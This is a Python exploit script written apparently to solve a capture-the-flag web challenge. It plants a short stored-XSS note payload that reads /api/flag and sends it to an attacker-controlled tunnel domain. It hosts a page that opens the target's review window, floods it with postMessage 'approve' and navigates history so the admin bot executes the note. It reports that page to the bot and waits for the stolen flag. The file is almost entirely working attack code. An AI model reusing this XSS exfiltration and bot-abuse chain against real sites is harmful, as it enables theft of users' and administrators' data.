import http.server
import socketserver
import subprocess
import threading
import requests
import urllib.parse
import urllib3
import time
import re
import os
import sys

urllib3.disable_warnings()

CHALL_URL = os.environ.get("CHALL_URL", "https://bce39874e58917f4.chal.ctf.ae").rstrip("/")
# MODE=beacon -> note just beacons to /f?x=run (tests render+approved)
# MODE=flag   -> note fetches /api/flag and exfils
MODE = os.environ.get("MODE", "flag")
GO_DELAY = float(os.environ.get("GO_DELAY", "3.5"))  # seconds before history.go(-2)
PORT = 8000

tunnel_domain = None
tunnel_url = None
flag_captured = None
server_ready = threading.Event()
tunnel_ready = threading.Event()
done_event = threading.Event()


class ExploitHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[HTTP] {self.command} {self.path}")

    def do_GET(self):
        global flag_captured
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")

        if parsed.path == "/empty.js":
            self.send_header("Content-Type", "application/javascript")
            self.end_headers()
            self.wfile.write(((
                "fetch('//%s/e?t=sandbox-exec',{mode:'no-cors'}).catch(()=>{});\n"
                "setTimeout(function(){location='//%s/sbx?t=sandbox-script';},1000);\n"
            ) % (tunnel_domain, tunnel_domain)).encode())
            return

        if parsed.path == "/exploit":
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            html = f"""<!DOCTYPE html>
<html>
<body>
<h1>Processing review...</h1>
<script>
const params = new URLSearchParams(location.search);
const rid = params.get('rid');
const targetOrigin = "{CHALL_URL}";
const u = location.origin + "/empty.js";
const reviewUrl = targetOrigin + "/review?rid=" + encodeURIComponent(rid) + "&u=" + encodeURIComponent(u);
const t0 = Date.now();
const ping = (t,v) => fetch('//{tunnel_domain}/'+t+(v?'?'+v:''),{{mode:'no-cors'}}).catch(()=>{{}});
ping('evt','t=page-start&hl='+history.length);
addEventListener('pagehide', () => ping('evt','t=pagehide&hl='+history.length));
addEventListener('pageshow', (e) => ping('evt','t=pageshow&persisted='+(e.persisted?'1':'0')+'&hl='+history.length));
const w = window.open(reviewUrl);
ping('evt','t=opened&w='+(w?'yes':'NO'));
let sent = 0;
const timer = setInterval(() => {{ if (w) {{ w.postMessage("approve","*"); sent++; }} }}, 50);
const beat = setInterval(() => ping('dbg','t=b&n='+sent+'&ms='+(Date.now()-t0)), 500);
setTimeout(() => {{ if (w && w.closed) ping('evt','t=popup-closed'); }}, 1500);
setTimeout(() => {{
  clearInterval(timer);
  ping('evt','t=go-history&ms='+(Date.now()-t0));
  try {{ history.go(-2); }} catch(e) {{ ping('evt','t=go-err&e='+e.message); }}
}}, {GO_DELAY*1000});
setTimeout(() => {{ clearInterval(beat); ping('evt','t=alive&ms='+(Date.now()-t0)); }}, {GO_DELAY*1000+9000});
</script>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
            return

        if parsed.path in ["/flag", "/f"]:
            flag = qs.get("f", [None])[0] or qs.get("x", [None])[0] or parsed.query
            print(f"\n{'='*60}\n[+] HIT ON FLAG ENDPOINT: {flag}\n{'='*60}\n")
            if flag and "pwnsec{" in flag:
                flag_captured = flag
                done_event.set()
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK\n")
            return

        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Not found\n")


def start_http_server():
    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    with ReusableTCPServer(("0.0.0.0", PORT), ExploitHandler) as httpd:
        server_ready.set()
        print(f"[*] Local HTTP server listening on port {PORT}")
        while not done_event.is_set():
            httpd.handle_request()


def start_tunnel():
    global tunnel_domain, tunnel_url
    print("[*] Starting ssh tunnel to localhost.run...")
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ExitOnForwardFailure=yes", "-R", f"80:127.0.0.1:{PORT}", "nokey@localhost.run"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    for line in iter(proc.stdout.readline, ''):
        print("[SSH]", line.strip())
        m = re.search(r'https://([a-zA-Z0-9.-]+\.lhr\.life)', line)
        if m:
            tunnel_domain = m.group(1)
            tunnel_url = f"https://{tunnel_domain}"
            print(f"\n[+] TUNNEL ESTABLISHED: {tunnel_url}\n")
            tunnel_ready.set()
        if done_event.is_set():
            break
    proc.terminate()


def run():
    global flag_captured
    t_http = threading.Thread(target=start_http_server, daemon=True)
    t_http.start()
    server_ready.wait()

    if os.environ.get("NO_TUNNEL") == "1":
        global tunnel_domain, tunnel_url
        tunnel_domain = "localhost:8000"
        tunnel_url = "http://localhost:8000"
    else:
        t_ssh = threading.Thread(target=start_tunnel, daemon=True)
        t_ssh.start()
        if not tunnel_ready.wait(timeout=25):
            print("[-] Failed to establish tunnel in 25s!")
            return

    if MODE == "beacon":
        payload = f"<script>fetch('//{tunnel_domain}/f?x=run')</script>"
    else:
        payload = f"<script>fetch('/api/flag').then(r=>r.text()).then(d=>location='//{tunnel_domain}/f?x='+encodeURIComponent(d))</script>"
    print(f"[*] Note HTML payload (len={len(payload)}): {payload}")
    assert len(payload) <= 128, f"Payload too long: {len(payload)} > 128"

    session = requests.Session()
    session.verify = False

    r_create = session.post(f"{CHALL_URL}/create", data={"title": "pwn", "html": payload}, allow_redirects=False, timeout=10)
    print(f"[*] Create note response status: {r_create.status_code}")
    location = r_create.headers.get("Location", "")
    m = re.search(r'/note/([a-zA-Z0-9]+)', location)
    if not m:
        print("[-] Failed to extract note id!")
        return
    note_id = m.group(1)
    print(f"[+] Created Note ID: {note_id}")

    time.sleep(3)
    exploit_url = f"{tunnel_url}/exploit?note={note_id}"
    for attempt in range(4):
        try:
            r_self = requests.get(f"{tunnel_url}/exploit?note=selftest", timeout=15, verify=False)
            print(f"[*] Tunnel self-test: {r_self.status_code}")
            if r_self.status_code == 200:
                break
        except Exception as e:
            print(f"[*] Tunnel self-test failed: {e}")
        time.sleep(5)

    print(f"[*] Submitting report URL to bot: {exploit_url}")
    for attempt in range(1, 4):
        if done_event.is_set():
            break
        r_report = None
        t0 = time.time()
        try:
            r_report = session.post(f"{CHALL_URL}/report", data={"url": exploit_url}, timeout=45)
            print(f"[*] Report response: {r_report.status_code} in {round(time.time()-t0, 2)}s body={r_report.text[:120]}")
        except Exception as e:
            print(f"[*] Report request failed: {e}")
        if r_report.status_code == 200:
            break
        if done_event.wait(timeout=5):
            break
        print(f"[*] Retrying report (attempt {attempt + 1}/3)...")
        time.sleep(8)

    print("[*] Waiting for flag...")
    if done_event.wait(timeout=30):
        print(f"\n{'='*60}\n[SUCCESS] FLAG: {flag_captured}\n{'='*60}\n")
    else:
        print("[-] Timed out waiting for flag.")

    done_event.set()


if __name__ == "__main__":
    run()